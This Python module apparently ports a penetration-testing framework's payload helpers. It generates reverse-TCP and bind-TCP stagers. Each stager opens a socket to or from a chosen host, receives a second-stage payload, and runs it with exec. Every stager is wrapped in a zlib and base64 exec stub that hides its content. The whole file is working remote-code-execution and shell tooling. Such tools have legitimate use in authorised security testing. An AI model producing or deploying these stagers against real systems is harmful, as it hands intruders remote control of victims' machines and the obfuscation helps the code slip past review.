import base64
import zlib


# Module-level helpers (usable without instantiating PythonPayload)


def create_exec_stub(python_code):
    """Encode *python_code* in a zlib + base64 exec stub."""
    compressed = zlib.compress(python_code.encode("utf-8"))
    encoded = base64.b64encode(compressed).decode("ascii")
    return f"exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('{encoded}')[0])))"


def generate_reverse_tcp(host, port, retry_count=0, retry_wait=0.0):
    """Generate a Python reverse-TCP stager and wrap it in create_exec_stub."""
    needs_time = retry_wait > 0
    imports = "import socket,zlib,base64,struct" + (",time" if needs_time else "")
    cmd = imports + "\n"

    if retry_wait == 0 and retry_count == 0:
        # No retry - connect once (old-style, matches MSF when retry options absent)
        cmd += "s=socket.socket(2,socket.SOCK_STREAM)\n"
        cmd += f"s.connect(('{host}',{port}))\n"
    else:
        # Retry loop
        if retry_count > 0:
            cmd += f"for x in range({retry_count}):\n"
        else:
            cmd += "while 1:\n"
        cmd += "\ttry:\n"
        cmd += "\t\ts=socket.socket(2,socket.SOCK_STREAM)\n"
        cmd += f"\t\ts.connect(('{host}',{port}))\n"
        cmd += "\t\tbreak\n"
        cmd += "\texcept:\n"
        if retry_wait <= 0:
            cmd += "\t\tpass\n"
        else:
            cmd += f"\t\ttime.sleep({retry_wait})\n"

    # Receive and exec the stage
    cmd += "l=struct.unpack('>I',s.recv(4))[0]\n"
    cmd += "d=s.recv(l)\n"
    cmd += "while len(d)<l:\n"
    cmd += "\td+=s.recv(l-len(d))\n"
    cmd += "exec(zlib.decompress(base64.b64decode(d)),{'s':s})\n"

    return create_exec_stub(cmd)


def generate_bind_tcp(port):
    """Generate a Python bind-TCP stager and wrap it in create_exec_stub."""
    cmd = "import zlib,base64,socket,struct\n"
    cmd += "b=socket.socket(2,socket.SOCK_STREAM)\n"
    cmd += f"b.bind(('0.0.0.0',{port}))\n"
    cmd += "b.listen(1)\n"
    cmd += "s,a=b.accept()\n"
    cmd += "l=struct.unpack('>I',s.recv(4))[0]\n"
    cmd += "d=s.recv(l)\n"
    cmd += "while len(d)<l:\n"
    cmd += "\td+=s.recv(l-len(d))\n"
    cmd += "exec(zlib.decompress(base64.b64decode(d)),{'s':s})\n"

    return create_exec_stub(cmd)


# Mixin class


class PythonPayload:
    """Mixin that provides Python payload generation helpers as instance methods."""

    #: Zlib compression makes output size non-deterministic.
    FORCE_DYNAMIC_CACHED_SIZE = True

    @staticmethod
    def create_exec_stub(python_code):
        """Instance-accessible alias for the module-level create_exec_stub."""
        return create_exec_stub(python_code)

    def generate_reverse_tcp(
        self,
        host,
        port,
        retry_count=0,
        retry_wait=0.0,
    ):
        """Instance-accessible alias for the module-level generate_reverse_tcp."""
        return generate_reverse_tcp(
            host=host,
            port=port,
            retry_count=retry_count,
            retry_wait=retry_wait,
        )

    def generate_bind_tcp(self, port):
        """Instance-accessible alias for the module-level generate_bind_tcp."""
        return generate_bind_tcp(port=port)
